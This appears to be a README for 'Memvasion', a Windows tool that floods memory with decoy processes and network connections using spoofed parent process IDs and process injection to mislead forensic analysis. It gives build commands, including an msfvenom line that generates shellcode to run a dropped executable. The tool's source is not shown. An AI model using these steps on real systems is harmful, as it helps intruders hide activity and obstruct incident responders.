# Memvasion
Memvasion floods the system memory with legitimate-looking processes and network connections, using spoofed Parent Process Identifiers (PPIDs), process injection and randomized characteristics, to create a complex and misleading memory state.

## Compile
### Compile net_conn.c to net_conn.exe
```
gcc net_conn.c -o net_conn.exe -lws2_32
```

### Create hex dump of net_conn.exe to net_conn.h
```
xxd -i net_conn.exe > net_conn.h
```

### Create shellcode for running net_conn.exe (Copy into memvasion.c)
```
msfvenom -a x64 --platform Windows -p windows/x64/exec CMD="C:\\Users\\Public\\net_conn.exe" -f c
```

### Compile memvasion.c to memvasion.exe (Ensure net_conn.h is in the same directory)
```
gcc memvasion.c -o memvasion.exe -lpsapi
```

## Run
Run memvasion to flood system with proccesses and network connections.
```
memvasion.exe
```
